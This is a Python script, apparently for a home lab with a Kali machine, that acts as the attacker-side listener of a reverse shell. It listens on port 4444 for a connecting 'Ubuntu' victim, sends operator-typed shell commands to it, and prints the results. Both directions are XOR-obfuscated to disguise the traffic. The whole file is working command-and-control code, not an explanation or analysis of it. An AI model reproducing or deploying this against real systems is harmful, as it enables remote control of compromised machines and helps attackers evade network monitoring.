# kali_server_simple.py
import socket
import threading

XOR_KEY = 0x41  # کلید ساده

def xor_encrypt(data):
    return bytes([b ^ XOR_KEY for b in data])

def xor_decrypt(data):
    return bytes([b ^ XOR_KEY for b in data])

def handle_client(conn, addr):
    print(f"\n[+] New connection from {addr}")
    
    try:
        while True:
            # گرفتن دستور از کاربر
            cmd = input("\n🔹 shell> ").strip()
            
            if cmd == "":
                continue
            if cmd.lower() == "exit":
                print("[*] Closing connection...")
                break
            
            # رمزنگاری و ارسال
            encrypted = xor_encrypt(cmd.encode())
            conn.sendall(encrypted + b'\n')
            
            # دریافت پاسخ
            response = b""
            while True:
                chunk = conn.recv(1024)
                if not chunk or chunk.endswith(b'\n'):
                    response += chunk
                    break
                response += chunk
            
            if response:
                decrypted = xor_decrypt(response.rstrip(b'\n'))
                print(decrypted.decode())
    
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        conn.close()
        print(f"[*] Connection closed")

def start_server():
    host = "192.168.253.129"
    port = 4444
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    
    print(f"[*] Listening on {host}:{port}")
    print("[*] Waiting for Ubuntu to connect...")
    
    conn, addr = server.accept()
    handle_client(conn, addr)
    server.close()

if __name__ == "__main__":
    start_server()

    